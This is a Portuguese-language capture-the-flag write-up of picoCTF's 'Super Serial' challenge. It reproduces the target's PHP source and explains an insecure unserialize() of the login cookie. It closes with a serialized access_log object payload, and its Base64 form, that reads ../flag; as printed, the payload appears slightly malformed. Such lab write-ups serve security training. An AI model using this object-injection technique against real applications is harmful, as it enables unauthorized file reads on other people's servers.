#  CTF Super Serial (Web Exploitation)
###### solved by @oGabriel674

> this is a CTF about Web Exploitation

## Desafio: Super Serial (Web Exploitation)
#### Intrudução

Este é um desafio de [CTF](https://hackersec.com/desafios-hacker-o-que-sao-os-ctf/) (Capture The Flag), apresentado em 2021 pela plataforma [picoCTF](https://picoctf.org/).

- [Página do desafio](https://play.picoctf.org/practice/challenge/180?page=1&search=super%20serial)
  
#### Análise Inicial

O desafio possui o seguinte enunciado:

<img width="634" height="226" alt="Captura de tela 2026-02-09 142639" src="https://github.com/user-attachments/assets/f3d7c431-32dc-4369-bad4-0970cc926f13" />

E a seguinte dica:

> - The flag is at ../flag (A bandeira está em ../flag)

#### solução

No início do desafio, somos apresentados a seguinte tela de login:

<img width="537" height="350" alt="Captura de tela 2026-02-08 203155" src="https://github.com/user-attachments/assets/a0bc12a2-0197-4a88-8719-49c87bdc395c" />

Ao tentar realizar o login, como não possuíamos credenciais válidas de usuário e senha, o sistema retornou a seguinte mensagem de erro.

<img width="1806" height="68" alt="Captura de tela 2026-02-09 144321" src="https://github.com/user-attachments/assets/f1de7543-01a0-417a-81da-e5419e27190c" />

 Ao consultar o arquivo robots.txt, nos é revelado a existência do seguinte diretório:

<img width="202" height="50" alt="Captura de tela 2026-02-09 145558" src="https://github.com/user-attachments/assets/4538e8e4-1deb-44a1-9bad-81e4bd50748a" />
 
O sufixo __`.phps`__ se refere a um arquivo de código-fonte PHP formatado ([__PHP Source__](https://lbodev.com.br/glossario/o-que-e-php-source-code-management/#google_vignette)). Diferentemente de um arquivo __.php__ comum, que é interpretado e executado pelo servidor para gerar uma página funcional, o arquivo __.phps__ é configurado para exibir o código-fonte de forma legível, geralmente com realce de sintaxe (syntax highlighting). Essa característica permite visualizar diretamente a lógica implementada, sem que o servidor execute o script.

Logo o arquivo __admin.phps__ corresponderia ao código-fonte da página de administração. No entanto, ao tentar acessá-lo, notamos que aparentemente não há uma página administrativa disponível.

<img width="623" height="171" alt="Captura de tela 2026-02-10 152936" src="https://github.com/user-attachments/assets/eb082348-c9f9-409c-b9d2-c89cc64379b1" />

Apesar de não encontrarmos uma página de administração ativa, conseguimos acessar o código-fonte da página inicial por meio do diretório __`/index.phps`__. Esse arquivo nos forneceu informações importantes sobre o processo de autenticação de usuários, além de indicar a existência de outros diretórios relevantes: __`/authentication.phps`__ e __`/cookie.php`__.

```
<?php
require_once("cookie.php");

if(isset($_POST["user"]) && isset($_POST["pass"])){
	$con = new SQLite3("../users.db");
	$username = $_POST["user"];
	$password = $_POST["pass"];
	$perm_res = new permissions($username, $password);
	if ($perm_res->is_guest() || $perm_res->is_admin()) {
		setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
		header("Location: authentication.php");
		die();
	} else {
		$msg = '<h6 class="text-center" style="color:red">Invalid Login.</h6>';
	}
}
?>

<!DOCTYPE html>
<html>
<head>
<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<link href="style.css" rel="stylesheet">
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
</head>
	<body>
		<div class="container">
			<div class="row">
				<div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
					<div class="card card-signin my-5">
						<div class="card-body">
							<h5 class="card-title text-center">Sign In</h5>
							<?php if (isset($msg)) echo $msg; ?>
							<form class="form-signin" action="index.php" method="post">
								<div class="form-label-group">
									<input type="text" id="user" name="user" class="form-control" placeholder="Username" required autofocus>
									<label for="user">Username</label>
								</div>

								<div class="form-label-group">
									<input type="password" id="pass" name="pass" class="form-control" placeholder="Password" required>
									<label for="pass">Password</label>
								</div>

								<button class="btn btn-lg btn-primary btn-block text-uppercase" type="submit">Sign in</button>
							</form>
						</div>
					</div>
				</div>
			</div>
		</div>
	</body>
</html>

```
Ao analisar o código-fonte disponibilizado pelos diretórios __``/cookie.phps``__ e __``/authentication.phps``__, obtivemos informações relevantes sobre o funcionamento da aplicação. O arquivo __/cookie.phps__ define a classe de permissões e realiza a validação do perfil do usuário (__guest ou admin__) consultando o banco de dados da página. Além disso, ele lê o cookie de login e reconstrói o objeto de permissões para verificar o acesso. Já o arquivo __/authentication.phps__ é responsável por registrar os acessos e exibir uma mensagem de boas-vindas ao usuário.

> Código /cookie.phps:

```
<?php
session_start();

class permissions
{
	public $username;
	public $password;

	function __construct($u, $p) {
		$this->username = $u;
		$this->password = $p;
	}

	function __toString() {
		return $u.$p;
	}

	function is_guest() {
		$guest = false;

		$con = new SQLite3("../users.db");
		$username = $this->username;
		$password = $this->password;
		$stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
		$stm->bindValue(1, $username, SQLITE3_TEXT);
		$stm->bindValue(2, $password, SQLITE3_TEXT);
		$res = $stm->execute();
		$rest = $res->fetchArray();
		if($rest["username"]) {
			if ($rest["admin"] != 1) {
				$guest = true;
			}
		}
		return $guest;
	}

        function is_admin() {
                $admin = false;

                $con = new SQLite3("../users.db");
                $username = $this->username;
                $password = $this->password;
                $stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
                $stm->bindValue(1, $username, SQLITE3_TEXT);
                $stm->bindValue(2, $password, SQLITE3_TEXT);
                $res = $stm->execute();
                $rest = $res->fetchArray();
                if($rest["username"]) {
                        if ($rest["admin"] == 1) {
                                $admin = true;
                        }
                }
                return $admin;
        }
}

if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}

?>
```
> Código /authentication.phps:

```
<?php

class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}

require_once("cookie.php");
if(isset($perm) && $perm->is_admin()){
	$msg = "Welcome admin";
	$log = new access_log("access.log");
	$log->append_to_log("Logged in at ".date("Y-m-d")."\n");
} else {
	$msg = "Welcome guest";
}
?>

<!DOCTYPE html>
<html>
<head>
<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<link href="style.css" rel="stylesheet">
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
</head>
	<body>
		<div class="container">
			<div class="row">
				<div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
					<div class="card card-signin my-5">
						<div class="card-body">
							<h5 class="card-title text-center"><?php echo $msg; ?></h5>
							<form action="index.php" method="get">
								<button class="btn btn-lg btn-primary btn-block text-uppercase" type="submit" onclick="document.cookie='user_info=; expires=Thu, 01 Jan 1970 00:00:18 GMT; domain=; path=/;'">Go back to login</button>
							</form>
						</div>
					</div>
				</div>
			</div>
		</div>
	</body>
</html>
```
O código-fonte da página inicial também nos mostra o formato esperado para o cookie de login.

Trecho do código:

```
if ($perm_res->is_guest() || $perm_res->is_admin()) {
		setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
		header("Location: authentication.php");
		die();
```
O formato esperado para o cookie de login trata-se de um [__objeto serializado em PHP__](https://lbodev.com.br/glossario/o-que-e-php-object-serialization/). A serialização é uma técnica utilizada para transformar um objeto — incluindo suas propriedades e valores — em uma sequência de texto ou bytes. Dessa forma, o objeto pode ser armazenado, transmitido ou posteriormente reconstruído pelo servidor. No contexto da aplicação, esse cookie serializado é lido e desserializado para recriar o objeto de permissões, permitindo validar se o usuário possui perfil __guest__ ou __admin__.

A tabela a seguir mostra um breve exemplo de como uma serializacao funciona.

<img width="844" height="590" alt="Captura de tela 2026-02-08 202956" src="https://github.com/user-attachments/assets/b0329ae9-e307-4b9a-bf46-911c75a92da3" />

Além da serialização o código-fonte também nos informa que o cookie deve estar codificado em [__Base6__](https://builtin.com/software-engineering-perspectives/base64-encoding).

Com essas informações em mãos, e utilizando o [__Burp Suite__](https://blog.solyd.com.br/o-que-e-o-burp-suite/) para interceptar as requisições, podemos modificar o cookie por meio do processo de serialização e, em seguida, codificá-lo em Base64. O resultado final fica com o seguinte formato:

__Serialização:__

>- O:10"access_log":1:{s:8"log_file";s:7:"../flag";}

__Codificação em Base64:__

>- TzoxMCJhY2Nlc3NfbG9nIjoxOntzOjgibG9nX2ZpbGUiO3M6NzoiLi4vZmxhZyI7fSANCg==
